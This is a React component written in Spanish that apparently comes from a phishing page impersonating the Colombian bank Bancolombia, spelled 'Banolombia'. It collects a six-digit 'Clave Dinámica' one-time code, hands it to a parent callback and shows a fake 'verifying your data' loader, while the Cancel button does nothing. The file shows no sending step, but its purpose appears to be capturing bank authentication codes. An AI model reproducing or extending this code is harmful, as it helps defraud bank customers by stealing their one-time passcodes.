/* eslint-disable react-hooks/rules-of-hooks */
"use client";
import { useRef, useState } from "react";

import FullScreenLoader from "./FullScreenLoader";

export default function Code6InputsDinamic({
  onComplete,
  error = false, // ← NUEVO PROP
}: {
  onComplete?: (code: string) => void;
  error?: boolean;
}) {
  const [values, setValues] = useState(["", "", "", "", "", ""]);
  const inputs = Array.from({ length: 6 }).map(() =>
    useRef<HTMLInputElement>(null)
  );
  const [loading, setLoading] = useState(false);

  const handleChange = (index: number, value: string) => {
    if (!/^[0-9]?$/.test(value)) return;

    const newValues = [...values];
    newValues[index] = value;
    setValues(newValues);

    if (value && index < 5) {
      inputs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && values[index] === "" && index > 0) {
      inputs[index - 1].current?.focus();
    }
  };

  return (
    <div className="flex flex-col items-center gap-8 py-10">
      <FullScreenLoader show={loading} text="Estamos verificando tus datos" />

      {/* Texto */}
      <p className="text-center text-lg text-black font-bold max-w-md">
        Consulta tu Clave Dinámica desde la APP Banolombia
      </p>

      {/* Inputs */}
      <div className="flex gap-3">
        {values.map((val, i) => (
          <input
            key={i}
            ref={inputs[i]}
            type="text"
            inputMode="numeric"
            maxLength={1}
            value={val}
            onChange={(e) => handleChange(i, e.target.value)}
            onKeyDown={(e) => handleKeyDown(i, e)}
            className={`
              w-12 h-16 text-center text-2xl font-semibold 
              rounded-md focus:outline-none 
              ${error ? "border-2 border-red-600" : "border border-black"}
            `}
          />
        ))}
      </div>

      {/* BOTONES */}
      <div className="w-full max-w-sm flex flex-col gap-4 mt-10 mx-auto">

        {/* Continuar */}
        <button
          className="
            w-full py-4 rounded-full 
            bg-[#FAD953] text-black bc-button-primary font-semibold text-lg
            border
          "
          onClick={() => {
            const code = values.join("");

            if (code.length !== 6) return; // evita enviar incompleto

            setLoading(true);

            // 👉 LLAMAR AL PADRE COMO handleChange automático
            onComplete?.(code);

            setTimeout(() => {
              setLoading(false);
            }, 2500);
          }}
        >
          Continuar
        </button>

        {/* Cancelar */}
        <button
          className="
            w-full py-4 rounded-full 
            text-black bc-button-primary cancels font-semibold text-lg
          "
        >
          Cancelar
        </button>

      </div>
    </div>
  );
}